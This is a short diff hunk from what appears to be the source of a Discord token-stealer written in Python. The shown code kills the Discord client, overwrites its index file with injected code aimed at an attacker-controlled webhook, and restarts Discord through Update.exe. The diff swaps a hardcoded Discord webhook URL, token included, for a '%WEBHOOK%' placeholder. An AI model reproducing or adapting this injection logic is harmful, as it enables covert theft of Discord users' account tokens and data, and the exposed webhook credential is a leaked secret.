@@ -1309,7 +1309,7 @@ class Main:
                                 if not webhook in file.read():
                                     await self.KillDiscord()
                                     with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
-                                        x.write(injection_code.replace('https://discord.com/api/webhooks/1154107526711885875/NiRTvgpX6duR7elXN25mcCV4SfUaxDq1Jm9YNXpkK42LGi9KbLKKeTaPeCu4gzqoCwlE', webhook))
+                                        x.write(injection_code.replace("%WEBHOOK%",webhook))
                                     command = os.path.join(_, "Update.exe") + " --processStart Discord.exe"
                                     result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
                                     await result.communicate()
